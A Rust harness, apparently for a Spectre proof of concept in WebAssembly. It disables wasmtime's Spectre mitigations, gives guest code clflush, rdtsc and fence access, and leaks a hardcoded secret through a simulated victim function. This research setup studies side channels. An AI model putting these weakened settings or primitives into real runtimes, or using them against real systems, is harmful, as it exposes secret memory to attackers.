use std::arch::asm;
#[cfg(all(target_arch = "x86_64"))]
use std::arch::x86_64::_mm_clflush;
#[cfg(all(target_arch = "x86_64"))]
use std::arch::x86_64::_mm_lfence;
#[cfg(all(target_arch = "x86_64"))]
use std::arch::x86_64::_mm_mfence;
#[cfg(all(target_arch = "x86_64"))]
use std::arch::x86_64::_rdtsc;
use std::io::Write;
use wasmtime::*;
use wasmtime_wasi::sync::WasiCtxBuilder;

const STRIDE: usize = 256;
const PAD: usize = 160;

const data_size: usize = 11;

static mut public_data: [u8; PAD] = [2; PAD/*pad here*/];

// TODO add padding to match the cache line size
// We need to pad the array to make cache lines aligned
// const array_for_prediction: [u8; 256 * STRIDE] = [0; 256 * STRIDE];
const secret_data: &str = "My password";
static mut tmp: u8 = 0;

pub static mut exfiltrated: Vec<u8> = vec![];

#[cfg(all(target_arch = "x86_64"))]
#[inline]
pub fn read_memory_offset(ptr: *const u8) -> u8 {
    let result: u8 = 0;
    unsafe {
        asm!(
            "mov {result}, [{x}]",
            x = in(reg) ptr,
            result = out(reg_byte) _
        );
    };
    result
}

pub fn create_linker(engine: &wasmtime::Engine) -> wasmtime::Linker<wasmtime_wasi::WasiCtx> {
    let mut linker = wasmtime::Linker::new(&engine);

    wasmtime_wasi::add_to_linker(&mut linker, |s| s).unwrap();
    // These methods are not in WASI by default, yet, let us assume they are
    // It is the same assumption of Swivel
    let linker = linker
        .func_wrap(
            "env",
            "_mm_clflush",
            |mut caller: wasmtime::Caller<'_, _>, param: u32| {
                // get the memory of the module
                // This comes on the guest address space, we need to translate it to the host address space

                let memory = caller.get_export("memory").unwrap().into_memory().unwrap();
                let memory_data = memory.data(&mut caller);
                let addr = &memory_data[param as usize] as *const u8;

                //                println!("Flush {:?}", addr);
                // flush the real address of the memory index
                unsafe {
                    asm! {
                       "clflush [{x}]",
                       x = in(reg) addr
                    }
                }
            },
        )
        .unwrap();

    let linker = linker
        .func_wrap(
            "env",
            "_mm_mfence",
            |_caller: wasmtime::Caller<'_, _>| unsafe {
                // println!("_mm_mfence");
                _mm_mfence();
            },
        )
        .unwrap();

    let linker = linker
        .func_wrap("env", "_rdtsc", |_caller: wasmtime::Caller<'_, _>| unsafe {
            _rdtsc()
        })
        .unwrap();

    let linker = linker
        .func_wrap(
            "env",
            "_mm_lfence",
            |_caller: wasmtime::Caller<'_, _>, _param: i32| unsafe {
                _mm_lfence();
            },
        )
        .unwrap();

    // This function does not exist in reality. We use it only to simulate a syncrhonized attack
    // We force the branch training to be syncronized when the attacker starts to measure (see
    // lines 146-154 of the spectre_wasm.rs file )
    //
    let secret_data_bytes = secret_data.as_bytes();
    let linker = linker
        .func_wrap(
            "env",
            "victim_code",
            |mut caller: wasmtime::Caller<'_, _>, i: u32| {
                // get the memory of the module
                let memory = caller.get_export("memory").unwrap().into_memory().unwrap();
                let memory_data = memory.data(&mut caller);

                let location = i as usize;
                //if location < data_size {
                unsafe {
                    let addr =
                        &memory_data[secret_data_bytes[location] as usize * STRIDE] as *const u8;
                    // lets print the address for logging
                    // println!("access {:?}", addr);

                    tmp &= read_memory_offset(addr);
                };
                //}
            },
        )
        .unwrap();

    // For the POC only to exfiltrate the bytes
    let linker = linker
        .func_wrap(
            "env",
            "save_byte",
            |_caller: wasmtime::Caller<'_, _>, param: i32| unsafe {
                unsafe {
                    exfiltrated.push(param as u8);
                }
            },
        )
        .unwrap();

    linker.clone()
}

pub fn execute_wasm(path: String) {
    println!("T-> Executing {}", path);

    let pathcp = path.clone();
    let filename = pathcp.split("/").last().unwrap();
    let binary = std::fs::read(path).unwrap();

    // Compile the binary and execute it with wasmtime

    let mut config = wasmtime::Config::default();
    let config = config.strategy(wasmtime::Strategy::Cranelift);
    // Remove spectre protection
    let config = config.cranelift_nan_canonicalization(false);
    let config =
        unsafe { config.cranelift_flag_set("enable_heap_access_spectre_mitigation", "no") };
    let config =
        unsafe { config.cranelift_flag_set("enable_table_access_spectre_mitigation", "no") };

    // This actually produces the same default binary :|
    // let config = config.cranelift_opt_level(wasmtime::OptLevel::SpeedAndSize);

    // We need to save the generated machine code to disk

    // Create a new store
    let engine = wasmtime::Engine::new(&config).unwrap();

    let module = wasmtime::Module::new(&engine, binary).unwrap();

    // Serialize it
    let serialized = module.serialize().unwrap();
    // Save it to disk, get the filename from the argument path
    std::fs::write(format!("{}.obj", filename), serialized).unwrap();

    let wasi = WasiCtxBuilder::new()
        .inherit_stdio()
        .inherit_args()
        .unwrap()
        .build();

    // TODO share the linker between instances ?
    let mut linker = create_linker(&engine);
    let mut store = wasmtime::Store::new(&engine, wasi);

    // let instance = linker.instantiate(&mut store, &module).unwrap();

    linker.module(&mut store, "", &module).unwrap();

    linker
        .get_default(&mut store, "")
        .unwrap()
        .typed::<(), ()>(&mut store)
        .unwrap()
        .call(&mut store, ())
        .unwrap();

    println!("-> Exeuting finished");
}

pub fn main() {
    // Setting up the data
    unsafe {
        public_data[0] = 1;
        public_data[1] = 2;
        public_data[2] = 3;
        public_data[3] = 4;
        public_data[4] = 5;
        public_data[5] = 6;
        public_data[6] = 7;
        public_data[7] = 8;
        public_data[8] = 9;
        public_data[9] = 10;
        public_data[10] = 11;
        public_data[11] = 12;
        public_data[12] = 13;
        public_data[13] = 14;
        public_data[14] = 15;
        public_data[15] = 16;
    }

    // Load the eviction binary first as the attacker an run it
    // TODO, get the binary from the command line first argument
    let args: Vec<String> = std::env::args().collect();

    // Create two threads, one hearing for "execute" command, once received, execute the binary
    // into a separate thread
    // TODO share the linker

    // let mut threads = vec![];
    println!("-> Type a token to command");
    print!("-> ");
    std::io::stdout().flush().unwrap();
    loop {
        // Read the command line
        let mut input = String::new();
        std::io::stdin().read_line(&mut input).unwrap();
        println!("-> Processing command '{}'", input.trim());
        print!("\r-> ");
        std::io::stdout().flush().unwrap();
        // Flush std
        if input.trim() == "execute" {
            println!("   Type the number of times to execute");
            let mut input = String::new();
            // Read the next line to get the number of times to execute
            std::io::stdin().read_line(&mut input).unwrap();
            let inputcp = input.clone();
            let times = inputcp.trim().parse::<u32>().unwrap();
            println!("   Type the path of the file to execute");
            let mut input = String::new();

            // Read the next line to get the filename path of the file to execute
            std::io::stdin().read_line(&mut input).unwrap();

            // Discard last character which is the endline

            let inputcp = input.clone();
            let path = String::from(inputcp.trim());

            /*let job = std::thread::spawn(move || {
                for i in 0..times {
                    println!("   {}", i);
                    execute_wasm(path.clone());
                }
            });
            threads.push(job);*/
            // Launch the thread to execute
            for i in 0..times {
                println!("   {}", i);
                execute_wasm(path.clone());
            }

            println!("-> Executing '{}' into a separated thread", input.trim());
            print!("\r-> ");
            std::io::stdout().flush().unwrap();
        } else if input.trim() == "exit" {
            // Wait for all threads, and the exit
            println!("-> Waiting for pending threads");
            //for t in threads {
            //    t.join().unwrap();
            //}
            break;
        } else {
            eprintln!("-> Invalid command '{}' ", input.trim());
            print!("\r-> ");
            std::io::stdout().flush().unwrap();
        }
    }
}
